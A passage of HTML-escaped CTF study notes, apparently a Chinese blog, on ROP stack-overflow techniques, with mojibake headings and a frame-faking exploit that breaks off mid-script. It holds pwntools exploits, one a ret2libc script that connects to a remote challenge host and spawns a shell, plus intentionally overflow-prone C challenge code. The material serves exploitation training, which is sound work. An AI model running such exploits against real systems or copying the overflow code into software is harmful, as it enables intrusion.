&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">remote&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;47.106.212.155&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">10008&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">elf&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">ELF&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;./ret2libc3&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">puts_plt&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">elf&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">plt&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;puts&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">start_main_got&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">elf&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">got&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;__libc_start_main&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">main&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">elf&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">symbols&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;main&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">flat&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="s2">&amp;#34;A&amp;#34;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">112&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">puts_plt&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">main&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">start_main_got&lt;/span>&lt;span class="p">])&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendlineafter&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Can you find it !?&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">libc_start_main_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">u32&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recv&lt;/span>&lt;span class="p">()[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">])&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">libc&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">LibcSearcher&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;__libc_start_main&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">libc_start_main_addr&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">libcbase&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">libc_start_main_addr&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">libc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">dump&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;__libc_start_main&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">sym_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">libcbase&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">libc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">dump&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;system&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">binsh_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">libcbase&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">libc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">dump&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;str_bin_sh&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">flat&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="s2">&amp;#34;A&amp;#34;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">112&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">sym_addr&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;bbbb&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">binsh_addr&lt;/span>&lt;span class="p">])&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">interactive&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="ä¸­çº§rop">ä¸­çº§ROP&lt;/h3>
&lt;h3 id="ret2csu">ret2csu&lt;/h3>
&lt;p>åˆ©ç”¨ x64 ä¸‹çš„ __libc_csu_init ä¸­çš„ gadgets.&lt;/p>
&lt;p>eg:level5:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#undef _FORTIFY_SOURCE
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">vulnerable_function&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">128&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">STDIN_FILENO&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">512&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">argc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">char&lt;/span>&lt;span class="o">**&lt;/span> &lt;span class="n">argv&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">STDOUT_FILENO&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;Hello, World&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">13&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">vulnerable_function&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>exp:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="ret2reg">ret2reg&lt;/h3>
&lt;ul>
&lt;li>ç•¥ æ— é¢˜ç›®&lt;/li>
&lt;/ul>
&lt;h3 id="brop">BROP&lt;/h3>
&lt;ul>
&lt;li>ç•¥ æ— äºŒè¿›åˆ¶&lt;/li>
&lt;/ul>
&lt;h3 id="é«˜çº§rop">é«˜çº§ROP&lt;/h3>
&lt;h3 id="ret2_dl_runtime_resolve">ret2_dl_runtime_resolve&lt;/h3>
&lt;p>XDCTF2015-pwn200&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">vuln&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">100&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">setbuf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">stdin&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">256&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">100&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;Welcome to XDCTF2015~!&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">setbuf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">stdout&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nf">strlen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buf&lt;/span>&lt;span class="p">));&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">vuln&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">//gcc -o bof -m32 -fno-stack-protector bof.c
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="srop">SROP&lt;/h3>
&lt;h3 id="ret2vdso">ret2VDSO&lt;/h3>
&lt;h3 id="èŠ±å¼æ ˆæº¢å‡º">èŠ±å¼æ ˆæº¢å‡º&lt;/h3>
&lt;ul>
&lt;li>stack pivoting&lt;/li>
&lt;/ul>
&lt;p>&lt;a class="link" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/X-CTF%20Quals%202016%20-%20b0verfl0w" target="_blank" rel="noopener"
>X-CTF Quals 2016 - b0verfl0w&lt;/a>&lt;/p>
&lt;p>è½¬ç§»å †ï¼š&lt;a class="link" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/EkoPartyCTF%202016%20fuckzing-exploit-200" target="_blank" rel="noopener"
>EkoPartyCTF 2016 fuckzing-exploit-200&lt;/a>&lt;/p>
&lt;ul>
&lt;li>frame faking&lt;/li>
&lt;/ul>
&lt;p>2018 å®‰æ’æ¯ over&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190522130814.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>ç›´æ¥EXP åˆ†æï¼Œï¼Œå›°æ‰°äº†å¾ˆä¹…çš„exp&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pwn&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="o">*&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">context&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">binary&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;./over.over&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">DEBUG&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">cmd&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">raw_input&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;DEBUG: &amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">gdb&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">attach&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">io&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">cmd&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">process&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;./over.over&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">elf&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">ELF&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;./over.over&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">libc&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">elf&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">libc&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendafter&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;a&amp;#39;&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">80&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">stack&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">u64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recvuntil&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\x7f&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)[&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">6&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">]&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">ljust&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\0&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mh">0x70&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">success&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;stack -&amp;gt; &lt;/span>&lt;span class="si">{:#x}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">stack&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># DEBUG(&amp;#34;b *0x4006B9\nc&amp;#34;) 96&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendafter&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">flat&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="s1">&amp;#39;11111111&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x400793&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">elf&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">got&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;puts&amp;#39;&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">elf&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">plt&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;puts&amp;#39;&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="mh">0x400676&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mi">80&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">40&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="s1">&amp;#39;1&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">stack&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x4006be&lt;/span>&lt;span class="p">]))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">libc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">address&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">u64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recvuntil&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\x7f&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)[&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">6&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">]&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">ljust&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\0&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="n">libc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sym&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;puts&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">success&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;libc.address -&amp;gt; &lt;/span>&lt;span class="si">{:#x}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">libc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">address&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">pop_rdi_ret&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mh">0x400793&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only &amp;#34;pop|ret&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">0x00000000000f5279 : pop rdx ; pop rsi ; ret
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">pop_rdx_pop_rsi_ret&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">libc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">address&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mh">0xf5279&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
